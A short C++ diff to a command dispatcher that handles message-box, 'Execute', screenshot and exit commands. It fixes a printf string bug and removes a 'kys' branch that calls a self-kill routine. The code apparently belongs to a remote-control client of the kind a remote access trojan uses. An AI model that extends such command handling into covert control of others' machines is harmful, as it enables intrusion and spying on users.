@@ -27,7 +27,7 @@ void CommandHandler::callFunction(const std::vector<std::string>& input)
     if (input[0] == "Message ")
     {
         commands::showMessageBox({ input[1], input[2] });
-        printf("Called showMessageBox('% s', '% s')\n", input[1], input[2]);
+        printf("Called showMessageBox('% s', '% s')\n", input[1].c_str(), input[2].c_str());
     }
 
     if (input[0] == "Execute ")
@@ -43,11 +43,6 @@ void CommandHandler::callFunction(const std::vector<std::string>& input)
     if (input[0] == "screentest ")
     {
         capture::screenshot();
-    }
-
-    if(input[0] == "kys ")
-    {
-        commands::KillYourSelf();
     }
 
     if(input[0] == "Exit ")
